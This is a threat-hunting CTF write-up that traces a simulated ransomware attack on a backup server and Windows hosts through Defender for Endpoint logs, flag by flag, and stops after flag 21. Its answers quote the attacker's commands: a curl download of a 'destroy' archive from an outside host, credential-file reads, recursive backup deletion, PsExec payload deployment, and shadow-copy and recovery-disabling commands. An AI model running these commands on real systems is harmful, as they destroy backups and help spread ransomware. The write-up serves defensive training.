# SOC Incident Investigation – Azuki Import/Export 

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/eeebf6367dbb5567021d790a025d5300dd61ca9e/RANSOM%20NOTE.png
)

- [Scenario Creation](https://github.com/Darya-cybersec/threat-hunting-scenario-tor/blob/main/threat-hunting-scenario-tor-event-creation.md)

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

## Date of Incident: 27 November 2025

##  Scenario

Dead in the Water – Azuki Import/Export (梓貿易株式会社)  
One week after the initial compromise, ransom notes are discovered across every system upon arrival Monday morning. It becomes clear that the threat actors were not only stealing data, but were preparing for widespread and destructive impact.

## The CEO needs answers:
- How did they get to our backup infrastructure?
- What exactly did they destroy?
- How did the ransomware spread so fast?
- Can we recover?

### High-Level TOR-Related IoC Discovery Plan

- **Check `DeviceFileEvents`** for any `tor(.exe)` or `firefox(.exe)` file events.
- **Check `DeviceProcessEvents`** for any signs of installation or usage.
- **Check `DeviceNetworkEvents`** for any signs of outgoing connections over known TOR ports.
The MDE LAW logs are your only source of truth. DeviceProcessEvents
---

## 🔎 Flag Analysis & Findings

### 🐧 PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)
**🚩 FLAG 1:** LATERAL MOVEMENT - Remote Access
Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.

**Discovery:** 
Workstations are common initial access and pivot points in ransomware campaigns. To identify which Azuki system was most likely compromised, process activity frequency was analyzed across Azuki devices.
RATIONALE 
The incident brief specifies that four Azuki systems are in scope and provides a starting point to identify relevant devices. The first step was to enumerate all devices associated with the Azuki environment.

 ![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/78310a67f868bfe637a5a58329851cbf54000a86/Picture1.png)

**Outcome:**
This query confirmed the presence of multiple Azuki systems, including servers and workstations. Among these was azuki-adminpc, which aligns with prior context from earlier stages of the investigation as a user-accessible workstation.

To reach Linux-based backup infrastructure from a Windows workstation, attackers commonly use Secure Shell (SSH) for remote access. Therefore, the next step was to inspect process execution on azuki-adminpc for evidence of SSH usage.

**Answer 🚩: ssh.exe" backup-admin@10.1.0.189**

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/01c0ad697d1cd5adcc7b95f8147d18fa5b60ea96/Picture2SSH.png)

**MITRE ATT&CK Mapping:** T1021.004 – Remote Services (SSH)

**🚩 FLAG 2:** LATERAL MOVEMENT - Attack Source

**Discovery:** After identifying SSH-based lateral movement originating from the compromised workstation (azuki-adminpc), network telemetry was analyzed to determine the source IP address responsible for initiating the connection. The investigation pivoted to the DeviceNetworkEvents table to examine outbound SSH traffic. Network events were filtered to include only connections from azuki-adminpc using TCP port 22, consistent with SSH activity targeting the backup server (azuki-backupsrv). The LocalIP field was reviewed to identify the IP address that initiated the connection, which was captured as the attack source.

**Answer: 🚩: 10.1.0.108**

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/ea11306f91dc04627c43c2bd8698ec86c4000599/Picture3.png)

**MITRE ATT&CK Mapping:** T1078.002: Valid Accounts - Domain Accounts

**🚩 FLAG 3:** CREDENTIAL ACCESS - Compromised Account
Administrative accounts with backup privileges provide access to critical recovery infrastructure.

**Discovery:** After identifying SSH-based lateral movement from the compromised workstation, process execution telemetry was reviewed to determine the account used to authenticate to the backup server. DeviceProcessEvents were filtered for SSH command execution originating from azuki-adminpc. The username specified in the SSH command line was extracted and identified as the account used to access the backup infrastructure.

**Answer 🚩: backup-admin**

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/047b1a28c1a9443a0ce5c1ec4f70a0157c506f31/Picture4.png)

**MITRE ATT&CK Mapping:** T1078.002: Valid Accounts - Domain Accounts

**🚩 FLAG 4:** DISCOVERY - Directory Enumeration
File system enumeration reveals backup locations and valuable targets for destruction.

**Discovery:** The DeviceProcessEvents table was queried to isolate executions of the ls command on the backup server, as this is a standard Linux utility used to list directory contents. By reviewing the resulting command lines, the directory listing command targeting the primary backup path was identified. The full command line used to enumerate the backup directory contents was captured as evidence of discovery activity consistent with MITRE ATT&CK technique T1083 – File and Directory Discovery.

**Answer 🚩: ls --color=auto -la /backups/**

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/df1654e20182b5e9858f0cfd1f0997989ebdb3ad/Picture5.png)

**MITRE ATT&CK Mapping:** T1083: File and Directory Discovery

**🚩 FLAG 5:** DISCOVERY - File Search
Attackers search for specific file types to identify high-value targets.

**Discovery:** The investigation progressed to determining whether the attacker searched for specific backup files. Since backups are commonly stored as compressed archive files, the next logical step was to look for file search activity targeting archive formats.
Process execution telemetry on the backup server was analyzed for file search commands, focusing on utilities capable of locating files by name. Among the observed commands, the find utility was identified as the tool used to search the filesystem. The command that specifically searched within the backup directory and targeted archive file extensions was selected, as it directly demonstrated intent to locate backup archives rather than perform system maintenance or unrelated checks.

**Answer 🚩:** find /backups -name *.tar.gzl

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/43c61881a567294d6cd428b4181120bf7c3196b8/Picture6.png)

**MITRE ATT&CK Mapping:** T1083: File and Directory Discovery

**🚩 FLAG 6:** DISCOVERY - Account Enumeration

Attackers enumerate local accounts to understand the system's user base.

**Discovery:** After identifying file and directory discovery activity on the backup server, the investigation continued by examining whether the threat actor enumerated local user accounts. Understanding the local user base is a common reconnaissance step used to identify potential privilege escalation targets or accounts of interest.

**Answer 🚩:cat /etc/passwd**

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/a33de4318548662444a6e869e8b9c0e03365a06c/Picture7.png)

**MITRE ATT&CK Mapping:** T1087.001: Account Discovery - Local Account

**🚩 FLAG 7:** DISCOVERY - Scheduled Job Reconnaissance
Understanding backup schedules helps attackers time their destruction for maximum impact.

**Discovery:** After identifying backup-related files, archive discovery, and local account enumeration activity on the backup server, the investigation progressed to determine whether the attacker inspected scheduled jobs to understand task execution timing. Since scheduled jobs on Linux systems are commonly defined within **cron** configuration files, process execution telemetry on the backup server was reviewed for commands that read cron configuration data.

**Answer 🚩: cat /etc/crontab**

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/bf45282865178694b6a277da25c32d4d61e8f596/Picture8.png)

**MITRE ATT&CK Mapping:** T1083: File and Directory Discovery

**🚩 FLAG 8:** DFLAG 8: COMMAND AND CONTROL - Tool Transfer
Attackers download tools from external infrastructure to carry out the attack.

**Discovery:** After completing discovery activities on the backup server, the investigation examined whether external tools were transferred onto the system. Process execution telemetry revealed a command using curl to download an archive from external infrastructure and save it locally. The use of an attacker-defined filename, destroy.7z, indicates the tool’s intended purpose rather than the transfer method. 

**Answer 🚩: curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z**

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/00331d213d4c744974459d0d507332f93e11dddb/Picture9.png)

**MITRE ATT&CK Mapping:** T1105: Ingress Tool Transfer

**🚩 FLAG 9:** : CREDENTIAL ACCESS - Credential Theft
Backup servers often store sensitive configuration files containing credentials.

**Discovery:** After identifying the attacker operating on the backup server and progressing through discovery actions (backup location enumeration, archive search, account enumeration, and scheduled job review), the investigation shifted to determine whether the attacker accessed files containing stored credentials. Because credentials-in-files activity on Linux typically appears as file content reads, process execution events were filtered for commands that display file contents (e.g., cat) and then reviewed for paths likely to contain sensitive data.

**Answer 🚩: cat /backups/configs/all-credentials.txt** 

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/6ec6455fcb46bdba5e74b7a05c3d98a095146849/Picture10.png)

**MITRE ATT&CK Mapping:** T1552.001: Unsecured Credentials - Credentials In Files

**🚩 FLAG 10:** IMPACT - Data Destruction: 
Destroying backups eliminates recovery options and maximises ransomware impact.

**Discovery:** After completing discovery, credential access, and tool transfer activities on the backup server, the investigation shifted to identifying actions that directly impacted data recovery capabilities. Process execution telemetry on the backup server was reviewed for commands associated with file deletion, specifically those using recursive removal utilities.
Multiple rm commands were observed; however, the following command was identified as the primary destructive action:

**Answer 🚩:** rm -rf /backups/archives /backups/azuki-adminpc ... 

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/696ffc32ffde9414159b959253965b17baa5c301/Picture11.png)

**MITRE ATT&CK Mapping:** T1485: Data Destruction

**🚩 FLAG 11:** IMPACT - Service Stopped 
Stopping services takes effect immediately but does NOT survive a reboot.

**Discovery:** After identifying destructive activity against backup data, process execution logs were reviewed to determine whether the attacker disrupted system services to cause immediate operational impact. The following command was identified as it stops the cron service, preventing scheduled jobs such as automated backups from running. 

**Answer 🚩:** systemctl stop cron

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/1a3af9b450e4258bf6620524535053bc59703b8f/Picture12.png)

**MITRE ATT&CK Mapping:** T1489 – Service Stop.

**🚩 FLAG 12:** IMPACT - Service Disabled

**Discovery:** After identifying temporary service disruption, the investigation focused on actions that would persist across system reboots. Process execution telemetry on the backup server was reviewed for commands that permanently disable services.

**Answer 🚩:** systemctl disable cron

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/6c728d2d7e942d0fb7884804850aec30954bcfe1/Picture13.png)

**MITRE ATT&CK Mapping:** T1489 – Service Stop

**💻 PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)**
**🚩 FLAG 13:** LATERAL MOVEMENT - Remote Execution
Remote administration tools enable attackers to deploy malware across multiple systems simultaneously.What tool executed commands on remote systems?

**Answer 🚩:** PsExec64.exe

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/7dc3c38dcb4e60b279d39b43307a413650a278d1/Picture14.png)

**MITRE ATT&CK Mapping:** T1021.002: SMB/Windows Admin Shares

**🚩 FLAG 14:** LATERAL MOVEMENT - Deployment Command
Full command lines reveal target systems, credentials, and deployed payloads. 

**Discovery:** After identifying PsExec64.exe as the remote execution tool, process execution telemetry was reviewed to capture the full deployment command used for lateral movement. The command includes the remote target, credentials supplied, and the payload copied and executed on the destination system. This confirms how the attacker deployed malware across the environment using SMB administrative shares.

**Answer 🚩:** PsExec64.exe \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe

**MITRE ATT&CK Mapping:** T1021.002: SMB/Windows Admin Shares

**🚩 FLAG 15:** EXECUTION - Malicious Payload
Identifying the payload enables threat hunting across the environment.

**Discovery:** After identifying the remote execution mechanism used for lateral movement, the investigation focused on the executable deployed across systems. Process execution logs showed that silentlynx.exe was copied to remote hosts and executed via PsExec, confirming it as the malicious payload used during ransomware deployment. 

**Answer 🚩:** silentlynx.exe

**MITRE ATT&CK Mapping:** T1204.002 – User Execution: Malicious File.

**🔥 PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)**
**🚩 FLAG 16:** IMPACT - Shadow Service Stopped
Ransomware stops backup services to prevent recovery during encryption.

**Discovery:** Process execution telemetry identified a command that stopped the Volume Shadow Copy service, immediately preventing the creation of new shadow copies during ransomware execution. 

**Answer 🚩:** net" stop VSS /y

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/888d12aad1d1684226140575155b4ce88d036bda/Picture16.png)

**MITRE ATT&CK Mapping:** T1490: Inhibit System Recovery

**🚩 FLAG 17:** IMPACT - Backup Engine Stopped
Stopping backup engines prevents backup operations during the attack.

**Discovery:** After identifying recovery-inhibition activity on the Azuki environment, the investigation shifted to determining whether Windows-native backup components were intentionally disabled. Process execution telemetry was reviewed for service control commands capable of stopping backup engines rather than scheduling or shadow copy services

**Answer 🚩:** "net" stop wbengine /y

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/f7bac7973afcfc97b652428a2b8ec47793498bd6/Picture17.png)

**MITRE ATT&CK Mapping:** T1490: Inhibit System Recovery

**🚩 FLAG 18:** DEFENSE EVASION - Process Termination
Certain processes lock files and must be terminated before encryption can succeed.

**Discovery:** During the investigation, multiple taskkill commands were observed targeting different applications and services. To determine which action was taken to unlock files for ransomware encryption, the analysis focused on processes known to maintain exclusive file locks on high-value data. The following command was selected because SQL Server actively locks database files while running, preventing other processes from modifying or encrypting them. Terminating sqlservr.exe immediately releases those locks, enabling ransomware to encrypt database files that would otherwise be inaccessible.
Other terminated processes (such as office applications, antivirus components, or utilities) may lock individual files or provide defensive capabilities, but database engines represent the most critical and commonly targeted file-locking processes during ransomware operations. This makes the termination of sqlservr.exe the most direct and impactful action to facilitate widespread data encryption.

**Answer 🚩:** "taskkill" /F /IM sqlservr.exe

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/7305d2f6afa655b45b82ab148303bc3984acbdad/Picture18.png)

**MITRE ATT&CK Mapping:** T1562.001: Impair Defenses - Disable or Modify Tools

**🚩 FLAG 19:** IMPACT - Recovery Point Deletion
Recovery points enable rapid file recovery without external backups.

**Discovery:** After identifying multiple actions aimed at disabling backup services and engines, the investigation shifted to determining whether existing recovery points were actively removed. On Windows systems, recovery points are managed through Volume Shadow Copies, which are commonly targeted by ransomware to prevent file restoration.
Because shadow copies are administered using the built-in vssadmin.exe utility, process execution telemetry was filtered specifically for executions of this binary across Azuki systems. Reviewing the full command lines associated with vssadmin.exe revealed a command that explicitly deleted all shadow copies. 

**Answer 🚩:** vssadmin.exe delete shadows /all /quiet

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/261aa7585b8bb0b5af71071492cbb16b3b21dcbf/Picture19.png)

**MITRE ATT&CK Mapping:** T1490: Inhibit System Recovery

**🚩 FLAG 20:** IMPACT - Storage Limitation
Limiting storage prevents new recovery points from being created.

**Discovery:** Following the deletion of existing recovery points, the investigation examined whether the attacker took additional steps to prevent the creation of new recovery points. Process execution telemetry revealed multiple vssadmin resize shadowstorage commands with different maximum storage allocations.
The following command was identified as the relevant action because reducing shadow storage to 401 MB is insufficient to sustain Volume Shadow Copy creation on a system drive. This effectively prevents Windows from generating new recovery points, even if the Volume Shadow Copy Service remains available. In contrast, a 5GB allocation would still allow shadow copies to be created and does not align with the attacker’s objective of fully inhibiting recovery.

**Answer 🚩:** "vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/77d7f2a6a879b6c39622e107938d5909e253956f/Picture20.png)

**MITRE ATT&CK Mapping:** T1490: Inhibit System Recovery

**🚩 FLAG 21:** IMPACT - Recovery Disabled
Windows recovery features enable automatic system repair after corruption.

**Discovery:** After confirming that recovery points were deleted and shadow storage was restricted, the investigation evaluated whether Windows automatic recovery features were explicitly disabled. Process execution telemetry was reviewed for boot configuration changes that affect system recovery behavior.The following command disables the Windows Recovery Environment (WinRE), preventing the system from entering automatic repair or recovery mode following system corruption or encryption. Disabling recovery at the boot configuration level ensures that recovery options remain unavailable even after a reboot, further limiting remediation capabilities.

**Answer 🚩:** "bcdedit" /set {default} recoveryenabled No

![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/c605158b4968c7e0c75b564d8650530457cb424c/Picture21.png)

**MITRE ATT&CK Mapping:** T1490: Inhibit System Recovery





